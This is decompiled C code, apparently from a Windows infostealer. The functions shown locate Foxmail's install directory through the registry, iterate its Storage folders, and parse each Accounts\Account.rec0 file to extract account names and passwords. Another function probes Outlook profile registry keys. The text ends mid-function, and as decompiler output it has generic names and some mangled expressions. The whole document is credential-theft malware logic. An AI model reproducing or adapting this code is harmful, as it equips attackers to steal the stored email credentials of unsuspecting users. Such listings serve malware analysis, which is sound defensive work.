    *(int32_t *)(v32 - 52) = 0;
    int32_t * v33 = CreateWindowExW((int32_t)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, &g322, &g322, &g322, &g322); // 0x40bc4f
    int32_t v34 = v32 + 24; // 0x40bc5a
    *(int32_t *)(v32 - 56) = 0;
    *(int32_t *)(v32 - 60) = 0;
    __asm_rep_stosd_memset((char *)v34, 0, 7);
    *(int32_t *)(v32 - 64) = (int32_t)v33;
    *(int32_t *)(v32 - 68) = v34;
    bool v35 = GetMessageA((struct tagMSG *)&g322, &g322, (int32_t)&g322, (int32_t)&g322); // 0x40bc70
    int32_t result = -1; // 0x40bc74
    if (!v35) {
        // 0x40bca3
        result = *(int32_t *)(v32 + 16);
    }
    // 0x40bca7
    function_406f1d();
    return result;
}

// Address range: 0x40bcbb - 0x40bcc7
int32_t function_40bcbb(void) {
    // 0x40bcbb
    return *(int32_t *)(g165 + 2640);
}

// Address range: 0x40bcc7 - 0x40bd1d
int32_t function_40bcc7(void) {
    // 0x40bcc7
    int32_t v1; // 0x40bcc7
    int32_t hObject = *(int32_t *)(v1 + 2676); // 0x40bcca
    int32_t v2; // bp-4, 0x40bcc7
    int32_t * v3 = &v2; // 0x40bcd2
    if (hObject != 0) {
        int32_t v4 = hObject; // bp-8, 0x40bcd4
        CloseHandle((int32_t *)hObject);
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    int32_t v6 = *(int32_t *)(v1 + 2668); // 0x40bcdb
    int32_t v7 = v5; // 0x40bce3
    if (v6 != 0) {
        // 0x40bce5
        v7 = v5 - 4;
        *(int32_t *)v7 = v6;
        CloseHandle(&g322);
    }
    // 0x40bcec
    function_413c16();
    *(int32_t *)(v7 - 4) = v1 + 2600;
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    function_401586();
    int32_t result = function_406f1d(); // 0x40bd12
    *(int32_t *)(v1 + 12) = 0;
    return result;
}

// Address range: 0x40bd1d - 0x40bd63
int32_t function_40bd1d(int32_t a1) {
    struct _RTL_CRITICAL_SECTION * v1 = (struct _RTL_CRITICAL_SECTION *)&g253; // bp-8, 0x40bd23
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g253);
    int32_t v2 = (int32_t)&v1; // 0x40bd31
    if (g247 != 0) {
        // 0x40bd33
        function_402771();
        g247 = 0;
        int32_t v3 = 0x40ab70; // bp-16, 0x40bd4e
        function_402746(0x40ab70, &g247);
        v2 = &v3;
    }
    // 0x40bd58
    *(int32_t *)(v2 - 4) = (int32_t)&g253;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    return &g322;
}

// Address range: 0x40bd63 - 0x40be01
int32_t function_40bd63(int32_t a1, int32_t a2) {
    // 0x40bd63
    int32_t lpCriticalSection; // bp-28, 0x40bd63
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&lpCriticalSection);
    __asm_rep_movsd_memcpy((char *)&g253, (char *)&lpCriticalSection, 6);
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&lpCriticalSection);
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g253);
    g258 = a1;
    GetModuleHandleA(NULL);
    g165 = &g247;
    if (a2 == 0) {
        // 0x40bdd5
        function_402771();
        g247 = 1;
        function_402746(0x40ba2c, &g247);
    } else {
        // 0x40bdbe
        function_402746(0x40ab70, &g247);
        g249 = 1;
    }
    // 0x40bdf4
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g253);
    return &g322;
}

// Address range: 0x40be01 - 0x40be9b
int32_t function_40be01(void) {
    // 0x40be01
    int128_t v1; // 0x40be01
    int128_t v2 = v1;
    *(int32_t *)&g252 = 5;
    g248 = 0;
    *(int32_t *)&g250 = 5;
    g251 = 0;
    function_401bbd();
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g253);
    function_413fc0();
    g254 = 0;
    __asm_movups(g259, __asm_xorps(v2, v2));
    g258 = 0;
    LoadLibraryW((int16_t *)&g322);
    g255 = function_41473a();
    g257 = function_41473a();
    g256 = function_41473a();
    return &g247;
}

// Address range: 0x40be9b - 0x40bed1
int32_t function_40be9b(void) {
    // 0x40be9b
    int32_t v1; // 0x40be9b
    *(int32_t *)v1 = (int32_t)&g77;
    function_413ee1();
    if (*(int32_t *)(v1 + 4) != 0) {
        // 0x40beb4
        function_413c16();
        function_406f8d();
    }
    int32_t result = function_406f1d(); // 0x40bec5
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x40bed1 - 0x40bed9
int32_t function_40bed1(void) {
    // 0x40bed1
    return function_413ee1();
}

// Address range: 0x40bed9 - 0x40bf25
int32_t function_40bed9(int32_t a1) {
    // 0x40bed9
    int32_t errorCode; // 0x40bed9
    if (function_413b2f() == 0) {
        // 0x40bf1a
        errorCode = GetLastError();
    } else {
        // 0x40beef
        function_413ef9(function_404011(a1));
        function_404081();
        errorCode = function_413ee1();
    }
    // 0x40bf20
    return errorCode;
}

// Address range: 0x40bf25 - 0x40bf5b
int32_t function_40bf25(int32_t a1) {
    int32_t result = 0; // 0x40bf38
    if (function_406fa7() != 0) {
        // 0x40bf3a
        function_404656(a1);
        result = function_413fdb((int32_t)&g322, (int32_t)&g322);
    }
    // 0x40bf52
    int32_t v1; // 0x40bf25
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x40bf5b - 0x40bf63
int32_t function_40bf5b(void) {
    // 0x40bf5b
    g166 = 0;
    int32_t result; // 0x40bf5b
    return result;
}

// Address range: 0x40bf63 - 0x40bf94
int32_t function_40bf63(void) {
    // 0x40bf63
    function_406f8d();
    function_406f1d();
    int32_t v1; // 0x40bf63
    *(int32_t *)(v1 + 4) = 0;
    int32_t result = function_406f1d(); // 0x40bf8a
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x40bf94 - 0x40c237
int32_t function_40bf94(int32_t lpFileName) {
    int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 7, NULL, 3, 0, NULL); // 0x40bfb1
    if (fileHandle == (int32_t *)-1) {
        // 0x40bfbe
        GetLastError();
        // 0x40c230
        return CloseHandle(fileHandle);
    }
    uint32_t nNumberOfBytesToRead = GetFileSize(fileHandle, NULL); // 0x40bfd2
    int32_t v1 = function_401000(nNumberOfBytesToRead); // 0x40bfde
    int32_t * lpBuffer = (int32_t *)v1; // 0x40bfec
    function_401293(lpBuffer, 0, nNumberOfBytesToRead);
    int32_t lpNumberOfBytesRead = 0; // bp-28, 0x40bff1
    ReadFile(fileHandle, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL);
    int32_t v2 = (int32_t)fileHandle; // bp-132, 0x40c007
    int32_t v3 = &v2; // 0x40c007
    CloseHandle(fileHandle);
    int32_t v4 = function_406f2c(); // 0x40c013
    int32_t v5 = function_406f2c(); // 0x40c024
    int32_t v6 = function_406f2c(); // 0x40c02e
    int32_t v7 = v3; // 0x40c03d
    char v8; // 0x40bf94
    int32_t v9; // 0x40bf94
    int32_t v10; // 0x40bf94
    int32_t v11; // 0x40bf94
    char * v12; // bp-36, 0x40bf94
    int32_t * v13; // 0x40bf94
    if (nNumberOfBytesToRead != 0) {
        char * v14 = (char *)v1;
        v13 = (int32_t *)(v3 - 4);
        int32_t v15 = 0; // 0x40c050
        int32_t v16 = 0;
        int32_t v17 = v4 - 7;
        int32_t v18 = v15 + v1;
        char v19 = *(char *)v18; // 0x40c051
        int32_t v20 = v16 & -256; // 0x40c051
        v12 = (char *)v17;
        int32_t v21 = v17; // 0x40c05c
        int32_t v22 = v20; // 0x40c05c
        char v23; // 0x40bf94
        unsigned char v24; // 0x40bf94
        int32_t v25; // 0x40bf94
        int32_t v26; // 0x40bf94
        int32_t v27; // 0x40bf94
        int32_t v28; // 0x40bf94
        int32_t v29; // 0x40c06e
        int32_t v30; // 0x40c13f
        unsigned char v31; // 0x40c141
        int32_t v32; // 0x40c0c6
        unsigned char v33; // 0x40c0c8
        int32_t v34; // 0x40c0d5
        int32_t v35; // 0x40c0d9
        unsigned char v36; // 0x40c0da
        if (v19 != 61 && v19 <= 126) {
            // 0x40c06b
            *(char *)(v17 + 7) = v19;
            v29 = v17 + 1;
            if ((v16 & 0xff00) != 0) {
                // 0x40c0f1
                v21 = v29;
                v22 = v20;
                if (*v12 == 80) {
                    // 0x40c0f9
                    v21 = v29;
                    v22 = v20;
                    if (*(char *)v29 == 97) {
                        // 0x40c0fe
                        v21 = v29;
                        v22 = v20;
                        if (*(char *)(v17 + 2) == 115) {
                            // 0x40c104
                            v21 = v29;
                            v22 = v20;
                            if (*(char *)(v17 + 3) == 115) {
                                // 0x40c10a
                                v21 = v29;
                                v22 = v20;
                                if (*(char *)(v17 + 4) == 119) {
                                    // 0x40c110
                                    v21 = v29;
                                    v22 = v20;
                                    if (*(char *)(v17 + 5) == 111) {
                                        // 0x40c116
                                        v21 = v29;
                                        v22 = v20;
                                        if (v19 == 100 == *(char *)(v17 + 6) == 114) {
                                            // 0x40c131
                                            *v13 = 9;
                                            v30 = (*v14 != -48 ? 9 : 2) + v18;
                                            v31 = *(char *)v30;
                                            v8 = v31;
                                            v9 = v30;
                                            v10 = 0;
                                            v11 = 0;
                                            if (v31 < 33) {
                                                goto lab_0x40c15d;
                                            } else {
                                                goto lab_0x40c14a;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                // 0x40c073
                v21 = v29;
                v22 = v20;
                if (7 - v4 + v29 >= 8) {
                    // 0x40c081
                    v21 = v29;
                    v22 = v20;
                    if (*(char *)v29 == 65) {
                        // 0x40c08a
                        v21 = v29;
                        v22 = v20;
                        if (*(char *)(v17 + 2) == 99) {
                            // 0x40c094
                            v21 = v29;
                            v22 = v20;
                            if (*(char *)(v17 + 3) == 99) {
                                // 0x40c09e
                                v21 = v29;
                                v22 = v20;
                                if (*(char *)(v17 + 4) == 111) {
                                    // 0x40c0a4
                                    v21 = v29;
                                    v22 = v20;
                                    if (*(char *)(v17 + 5) == 117) {
                                        // 0x40c0aa
                                        v21 = v29;
                                        v22 = v20;
                                        if (v19 == 116 == *(char *)(v17 + 6) == 110) {
                                            // 0x40c0b6
                                            *v13 = 9;
                                            v32 = (*v14 != -48 ? 9 : 2) + v18;
                                            v33 = *(char *)v32;
                                            v23 = v33;
                                            v28 = v32;
                                            v27 = 0;
                                            if (v33 >= 33) {
                                                v26 = 0;
                                                v24 = v23;
                                                v27 = v26;
                                                while (v24 < 127) {
                                                    // 0x40c0d5
                                                    v34 = v28 + 1;
                                                    *(char *)(v26 + v5) = v24;
                                                    v35 = v26 + 1;
                                                    v36 = *(char *)v34;
                                                    v23 = v36;
                                                    v25 = v35;
                                                    v28 = v34;
                                                    v27 = v35;
                                                    if (v36 < 33) {
                                                        // break -> 0x40c0e3
                                                        break;
                                                    }
                                                    v26 = v25;
                                                    v24 = v23;
                                                    v27 = v26;
                                                }
                                            }
                                            // 0x40c0e3
                                            *v13 = 2;
                                            *(char *)(v27 + v5) = 0;
                                            v21 = v29;
                                            v22 = 256;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        // 0x40c122
        v15++;
        v7 = v3;
        while (v15 < nNumberOfBytesToRead) {
            // 0x40c051
            v16 = v22;
            v17 = v21;
            v18 = v15 + v1;
            v19 = *(char *)v18;
            v20 = v16 & -256;
            v12 = (char *)v17;
            v21 = v17;
            v22 = v20;
            if (v19 != 61 && v19 <= 126) {
                // 0x40c06b
                *(char *)(v17 + 7) = v19;
                v29 = v17 + 1;
                if ((v16 & 0xff00) != 0) {
                    // 0x40c0f1
                    v21 = v29;
                    v22 = v20;
                    if (*v12 == 80) {
                        // 0x40c0f9
                        v21 = v29;
                        v22 = v20;
                        if (*(char *)v29 == 97) {
                            // 0x40c0fe
                            v21 = v29;
                            v22 = v20;
                            if (*(char *)(v17 + 2) == 115) {
                                // 0x40c104
                                v21 = v29;
                                v22 = v20;
                                if (*(char *)(v17 + 3) == 115) {
                                    // 0x40c10a
                                    v21 = v29;
                                    v22 = v20;
                                    if (*(char *)(v17 + 4) == 119) {
                                        // 0x40c110
                                        v21 = v29;
                                        v22 = v20;
                                        if (*(char *)(v17 + 5) == 111) {
                                            // 0x40c116
                                            v21 = v29;
                                            v22 = v20;
                                            if (v19 == 100 == *(char *)(v17 + 6) == 114) {
                                                // 0x40c131
                                                *v13 = 9;
                                                v30 = (*v14 != -48 ? 9 : 2) + v18;
                                                v31 = *(char *)v30;
                                                v8 = v31;
                                                v9 = v30;
                                                v10 = 0;
                                                v11 = 0;
                                                if (v31 < 33) {
                                                    goto lab_0x40c15d;
                                                } else {
                                                    goto lab_0x40c14a;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x40c073
                    v21 = v29;
                    v22 = v20;
                    if (7 - v4 + v29 >= 8) {
                        // 0x40c081
                        v21 = v29;
                        v22 = v20;
                        if (*(char *)v29 == 65) {
                            // 0x40c08a
                            v21 = v29;
                            v22 = v20;
                            if (*(char *)(v17 + 2) == 99) {
                                // 0x40c094
                                v21 = v29;
                                v22 = v20;
                                if (*(char *)(v17 + 3) == 99) {
                                    // 0x40c09e
                                    v21 = v29;
                                    v22 = v20;
                                    if (*(char *)(v17 + 4) == 111) {
                                        // 0x40c0a4
                                        v21 = v29;
                                        v22 = v20;
                                        if (*(char *)(v17 + 5) == 117) {
                                            // 0x40c0aa
                                            v21 = v29;
                                            v22 = v20;
                                            if (v19 == 116 == *(char *)(v17 + 6) == 110) {
                                                // 0x40c0b6
                                                *v13 = 9;
                                                v32 = (*v14 != -48 ? 9 : 2) + v18;
                                                v33 = *(char *)v32;
                                                v23 = v33;
                                                v28 = v32;
                                                v27 = 0;
                                                if (v33 >= 33) {
                                                    v26 = 0;
                                                    v24 = v23;
                                                    v27 = v26;
                                                    while (v24 < 127) {
                                                        // 0x40c0d5
                                                        v34 = v28 + 1;
                                                        *(char *)(v26 + v5) = v24;
                                                        v35 = v26 + 1;
                                                        v36 = *(char *)v34;
                                                        v23 = v36;
                                                        v25 = v35;
                                                        v28 = v34;
                                                        v27 = v35;
                                                        if (v36 < 33) {
                                                            // break -> 0x40c0e3
                                                            break;
                                                        }
                                                        v26 = v25;
                                                        v24 = v23;
                                                        v27 = v26;
                                                    }
                                                }
                                                // 0x40c0e3
                                                *v13 = 2;
                                                *(char *)(v27 + v5) = 0;
                                                v21 = v29;
                                                v22 = 256;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            // 0x40c122
            v15++;
            v7 = v3;
        }
    }
    goto lab_0x40c212;
  lab_0x40c212:
    // 0x40c212
    function_406f1d();
    function_406f1d();
    function_406f1d();
    *(int32_t *)(v7 - 4) = v1;
    // 0x40c230
    return function_401014((int32_t)&g322);
  lab_0x40c15d:;
    char * v37 = NULL; // bp-56, 0x40c162
    *(char *)(v11 + v6) = 0;
    *v13 = v6;
    function_40434f(v37);
    *(int32_t *)(v3 - 8) = v5;
    function_40434f((char *)&g322);
    int32_t v38 = (int32_t)&v12; // 0x40c185
    *(int32_t *)(v3 - 12) = v38;
    *(int32_t *)(v3 - 16) = function_4040d5(&g322);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v3 - 20) = v38;
    *(int32_t *)(v3 - 24) = function_4040d5(&g322);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v3 - 28) = (int32_t)&g15;
    *(int32_t *)(v3 - 32) = function_40460a((int16_t *)5);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    int32_t v39 = v3 - 52; // 0x40c1e9
    *(int32_t *)v39 = (int32_t)&v37;
    function_402790((int32_t)&g322);
    function_40283b();
    function_406f1d();
    function_406f1d();
    function_4015d4();
    v7 = v39;
    goto lab_0x40c212;
  lab_0x40c14a:;
    unsigned char v40 = v8;
    v11 = v10;
    if (v40 == 33 || v40 >= 127) {
        goto lab_0x40c15d;
    } else {
        // 0x40c152
        *(char *)(v10 + v6) = v40;
        int32_t v41 = v10 + 1; // 0x40c155
        int32_t v42 = v9 + 1; // 0x40c156
        unsigned char v43 = *(char *)v42; // 0x40c157
        v8 = v43;
        v9 = v42;
        v10 = v41;
        v11 = v41;
        if (v43 < 33) {
            goto lab_0x40c15d;
        } else {
            goto lab_0x40c14a;
        }
    }
}

// Address range: 0x40c237 - 0x40c293
int32_t function_40c237(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40c237
    int32_t phkResult; // bp-12, 0x40c237
    int32_t v1 = RegOpenKeyExA(HKEY_CURRENT_USER, "software\\Aerofox\\FoxmailPreview", 0, 0x20019, (int32_t **)&phkResult); // 0x40c252
    if (v1 != 0) {
        // 0x40c290
        return v1 & -256;
    }
    int32_t lpcbData = 260; // bp-8, 0x40c25f
    int32_t v2 = RegQueryValueExA((int32_t *)phkResult, "Executable", NULL, NULL, (char *)&g171, &lpcbData); // 0x40c279
    if (v2 != 0) {
        // 0x40c290
        return v2 & -256;
    }
    // 0x40c290
    return PathRemoveFileSpecA((char *)&g171) ? -255 : 1;
}

// Address range: 0x40c293 - 0x40c354
int32_t function_40c293(int32_t a1) {
    // 0x40c293
    int32_t lpBuffer; // bp-856, 0x40c293
    GetFullPathNameA((char *)&g169, 260, (char *)&lpBuffer, NULL);
    int32_t lpFileName; // bp-1120, 0x40c293
    PathCombineA((char *)&lpFileName, (char *)&lpBuffer, "*");
    char * v1 = (char *)&lpFileName; // bp-1172, 0x40c2e2
    int32_t lpFindFileData; // bp-592, 0x40c293
    int32_t * v2 = FindFirstFileA((char *)&lpFileName, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x40c2e3
    if (v2 == (int32_t *)-1) {
        // 0x40c34b
        return 0;
    }
    // 0x40c2f0
    int32_t v3; // bp-272, 0x40c293
    int32_t v4 = &v3;
    int32_t v5 = (int32_t)&v1;
    int32_t v6 = v5; // 0x40c2fc
    char v7; // 0x40c293
    char v8; // bp-548, 0x40c293
    if (v7 != 46 && (lpFindFileData || 16) == 16) {
        // 0x40c307
        *(int32_t *)(v5 - 4) = (int32_t)&v8;
        *(int32_t *)(v5 - 8) = (int32_t)&g169;
        *(int32_t *)(v5 - 12) = v4;
        PathCombineA((char *)&g322, (char *)&g322, (char *)&g322);
        *(int32_t *)(v5 - 16) = (int32_t)"Accounts\\Account.rec0";
        *(int32_t *)(v5 - 20) = v4;
        *(int32_t *)(v5 - 24) = v4;
        PathCombineA((char *)&g322, (char *)&g322, (char *)&g322);
        v6 = v5 - 28;
        *(int32_t *)v6 = v4;
        function_40bf94((int32_t)&g322);
    }
    // 0x40c339
    *(int32_t *)(v6 - 4) = (int32_t)&lpFindFileData;
    int32_t v9 = v6 - 8; // 0x40c340
    *(int32_t *)v9 = (int32_t)v2;
    while (FindNextFileA(&g322, (struct _WIN32_FIND_DATAA *)&g322)) {
        // 0x40c339
        v5 = v9;
        v6 = v5;
        if (v8 != 46 && (lpFindFileData || 16) == 16) {
            // 0x40c307
            *(int32_t *)(v5 - 4) = (int32_t)&v8;
            *(int32_t *)(v5 - 8) = (int32_t)&g169;
            *(int32_t *)(v5 - 12) = v4;
            PathCombineA((char *)&g322, (char *)&g322, (char *)&g322);
            *(int32_t *)(v5 - 16) = (int32_t)"Accounts\\Account.rec0";
            *(int32_t *)(v5 - 20) = v4;
            *(int32_t *)(v5 - 24) = v4;
            PathCombineA((char *)&g322, (char *)&g322, (char *)&g322);
            v6 = v5 - 28;
            *(int32_t *)v6 = v4;
            function_40bf94((int32_t)&g322);
        }
        // 0x40c339
        *(int32_t *)(v6 - 4) = (int32_t)&lpFindFileData;
        v9 = v6 - 8;
        *(int32_t *)v9 = (int32_t)v2;
    }
    // 0x40c34b
    return 0;
}

// Address range: 0x40c354 - 0x40c38d
int32_t function_40c354(void) {
    int32_t v1 = function_4040c4(); // 0x40c363
    char * v2 = StrStrA((char *)&g322, (char *)&g322); // 0x40c380
    if (v2 == NULL) {
        // 0x40c386
        return 0;
    }
    int32_t result = 0; // 0x40c378
    int32_t v3; // bp-28, 0x40c354
    int32_t v4 = &v3; // 0x40c37f
    result++;
    v4 -= 8;
    *(int32_t *)v4 = v1 + 4 + (int32_t)v2;
    char * v5 = StrStrA((char *)&g322, (char *)&g322); // 0x40c380
    while (v5 != NULL) {
        // 0x40c375
        result++;
        v4 -= 8;
        *(int32_t *)v4 = v1 + 4 + (int32_t)v5;
        v5 = StrStrA((char *)&g322, (char *)&g322);
    }
    // 0x40c386
    return result;
}

// Address range: 0x40c38d - 0x40c40c
int32_t function_40c38d(int32_t a1, int32_t a2) {
    int32_t v1 = function_4040c4(); // 0x40c39f
    int32_t v2 = a2; // 0x40c3b4
    int32_t v3; // bp-24, 0x40c38d
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = *(int32_t *)a1;
    int32_t v5 = v4 - 8; // 0x40c3b8
    int32_t v6; // 0x40c38d
    *(int32_t *)v5 = v6;
    int32_t v7 = v1 + 3 + (int32_t)StrStrA((char *)&g322, (char *)&g322); // 0x40c3c1
    v2--;
    while (v2 != 0) {
        // 0x40c3b7
        v4 = v5;
        *(int32_t *)(v4 - 4) = *(int32_t *)a1;
        v5 = v4 - 8;
        *(int32_t *)v5 = v7;
        v7 = v1 + 3 + (int32_t)StrStrA((char *)&g322, (char *)&g322);
        v2--;
    }
    // 0x40c3cb
    *(int32_t *)(v4 - 12) = (int32_t)"\",";
    *(int32_t *)(v4 - 16) = v7;
    char * v8 = StrStrA((char *)&g322, (char *)&g322); // 0x40c3d1
    int32_t v9 = function_406e8d(); // 0x40c3df
    int32_t * v10 = (int32_t *)(v4 - 20); // 0x40c3e9
    *v10 = (int32_t)v8 - v7;
    *(int32_t *)(v4 - 24) = v7;
    *(int32_t *)(v4 - 28) = v9;
    function_40126d(&g322, &g322, (int32_t)&g322);
    *v10 = v9;
    function_40434f((char *)&g322);
    function_406f1d();
    int32_t result; // 0x40c38d
    return result;
}

// Address range: 0x40c40c - 0x40c446
int32_t function_40c40c(void) {
    // 0x40c40c
    int32_t v1; // 0x40c40c
    if ((char)function_40c237(v1, v1, v1) != 0) {
        // 0x40c41a
        PathCombineA((char *)&g169, (char *)&g171, "Storage");
        function_40c293(v1);
        function_40bf94((int32_t)&g169);
    }
    // 0x40c440
    return 0;
}

// Address range: 0x40c446 - 0x40c44e
int32_t function_40c446(void) {
    // 0x40c446
    return function_402771();
}

// Address range: 0x40c44e - 0x40c469
int32_t function_40c44e(void) {
    // 0x40c44e
    int32_t v1; // 0x40c44e
    function_403eca((int32_t)&v1);
    return function_404081();
}

// Address range: 0x40c469 - 0x40c475
int32_t function_40c469(void) {
    // 0x40c469
    int32_t result; // 0x40c469
    int32_t v1; // 0x40c469
    if (*(int32_t *)(v1 + 32) != 0) {
        result = function_406f1d();
    }
    // 0x40c474
    return result;
}

// Address range: 0x40c475 - 0x40c73a
int32_t function_40c475(void) {
    // 0x40c475
    int32_t v1; // bp-1188, 0x40c475
    function_401293(&v1, 0, 1032);
    __asm_movups(0, __asm_movaps_1(g138));
    int32_t v2 = 0; // bp-8, 0x40c4b3
    int128_t v3; // 0x40c475
    __asm_movups(v3, __asm_movaps_1(g141));
    __asm_movups(v3, __asm_movaps_1(g139));
    __asm_movups(v3, __asm_movaps_1(g144));
    __asm_movups(v3, __asm_movaps_1(g143));
    __asm_movups(v3, __asm_movaps_1(g145));
    __asm_movups(v3, __asm_movaps_1(g140));
    __asm_movups(v3, __asm_movaps_1(g142));
    int128_t v4; // bp-156, 0x40c475
    __asm_rep_movsd_memcpy((char *)&v1, (char *)&v4, 32);
    int32_t v5; // 0x40c475
    int32_t v6 = *(int32_t *)(v5 + 40); // 0x40c523
    int32_t v7 = *(int32_t *)(v5 + 36); // 0x40c526
    function_40820b(1, 1);
    function_410170(v7, v6);
    char v8 = *(char *)(v7 + 3); // 0x40c58a
    char v9 = *(char *)(v7 + 2); // 0x40c59a
    char v10 = *(char *)(v7 + 1); // 0x40c5aa
    char v11 = *(char *)v7; // 0x40c5ba
    int32_t v12 = function_401000(v6); // 0x40c5c8
    function_407e70(&v1, v12, 256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11, &v2);
    int32_t v13 = function_4147a3(); // 0x40c5f1
    int32_t * v14 = (int32_t *)(v5 + 32); // 0x40c5fa
    *v14 = v13;
    function_401014(v12);
    if (*v14 == 0) {
        // 0x40c735
        return 0;
    }
    int32_t v15 = function_41473a(); // 0x40c614
    int32_t * v16 = (int32_t *)(v5 + 64); // 0x40c621
    *v16 = v15;
    g172 = function_41473a();
    int32_t v17 = function_41473a(); // 0x40c636
    int32_t * v18 = (int32_t *)(v5 + 68); // 0x40c643
    *v18 = v17;
    int32_t v19 = function_41473a(); // 0x40c646
    int32_t * v20 = (int32_t *)(v5 + 76); // 0x40c653
    *v20 = v19;
    *(int32_t *)(v5 + 80) = function_41473a();
    *(int32_t *)(v5 + 84) = function_41473a();
    *(int32_t *)(v5 + 88) = function_41473a();
    *(int32_t *)(v5 + 92) = function_41473a();
    int32_t v21 = function_41473a(); // 0x40c696
    int32_t * v22 = (int32_t *)(v5 + 96); // 0x40c6a3
    *v22 = v21;
    *(int32_t *)(v5 + 72) = function_41473a();
    *(int32_t *)(v5 + 60) = function_41473a();
    *(int32_t *)(v5 + 112) = function_41473a();
    *(int32_t *)(v5 + 116) = function_41473a();
    *(int32_t *)(v5 + 120) = function_41473a();
    *(int32_t *)(v5 + 128) = function_41473a();
    *(int32_t *)(v5 + 124) = function_41473a();
    if (*v16 == 0 || g172 == 0 || *v18 == 0 || *v20 == 0) {
        // 0x40c735
        return 0;
    }
    // 0x40c72b
    return *v22 != 0;
}

// Address range: 0x40c73a - 0x40c8fc
int32_t function_40c73a(void) {
    // 0x40c73a
    int32_t v1; // 0x40c73a
    function_401230(v1);
    int32_t v2; // bp-4116, 0x40c73a
    function_401293(&v2, 0, 2048);
    int32_t v3; // bp-8212, 0x40c73a
    function_401293(&v3, 0, 2048);
    int32_t phkResult; // bp-8, 0x40c73a
    int32_t v4 = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Office\\15.0Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", 0, 0xf003f, (int32_t **)&phkResult); // 0x40c791
    int32_t v5; // 0x40c73a
    int32_t ** v6; // bp-40, 0x40c73a
    if (v4 != 0) {
        // 0x40c79e
        v6 = (int32_t **)&phkResult;
        int32_t v7 = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", 0, 0xf003f, (int32_t **)&phkResult); // 0x40c7ae
        int32_t ** v8; // bp-60, 0x40c73a
        if (v7 != 0) {
            // 0x40c7bb
            v8 = (int32_t **)&phkResult;
            int32_t v9 = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676", 0, 0xf003f, (int32_t **)&phkResult); // 0x40c7cb
            int32_t ** v10; // bp-80, 0x40c73a
            if (v9 != 0) {
                // 0x40c7d8
                v10 = (int32_t **)&phkResult;
                int32_t v11 = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", 0, 0xf003f, (int32_t **)&phkResult); // 0x40c7e9
                if (v11 != 0) {
                    // 0x40c8f7
                    return 0;
                }
                int16_t * v12 = L"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"; // bp-100, 0x40c7f3
                v5 = (int32_t)&v12;
            } else {
                // 0x40c7d1
                v10 = (int32_t **)L"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676";
                v5 = (int32_t)&v10;
            }
        } else {
            // 0x40c7b4
            v8 = (int32_t **)L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676";
            v5 = (int32_t)&v8;
        }
    } else {
        // 0x40c797
        v6 = (int32_t **)L"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676";
        v5 = (int32_t)&v6;
    }
    int32_t v13 = &v2; // 0x40c800
    *(int32_t *)(v5 - 4) = v13;
    lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    *(int32_t *)(v5 - 8) = 0;
    *(int32_t *)(v5 - 12) = 0;
    *(int32_t *)(v5 - 16) = 0;
    *(int32_t *)(v5 - 20) = 0;
    *(int32_t *)(v5 - 24) = 0;
    *(int32_t *)(v5 - 28) = 0;
    int32_t hKey; // bp-12, 0x40c73a
    int32_t v14 = &hKey; // 0x40c80c
    *(int32_t *)(v5 - 32) = v14;
    int32_t v15; // bp-16, 0x40c73a
    *(int32_t *)(v5 - 36) = (int32_t)&v15;
    *(int32_t *)(v5 - 40) = 0;
    *(int32_t *)(v5 - 44) = 0;
    *(int32_t *)(v5 - 48) = 0;
    int32_t v16 = v5 - 52; // 0x40c814
    *(int32_t *)v16 = phkResult;
    int32_t v17 = RegQueryInfoKeyW(&g322, (int16_t *)&g322, &g322, &g322, &g322, &g322, &g322, &g322, &g322, &g322, &g322, (struct _FILETIME *)&g322); // 0x40c817
    if (v17 != 0) {
        // 0x40c8f7
        return 0;
    }
    // 0x40c825
    if (v15 == 0) {
        // 0x40c8f7
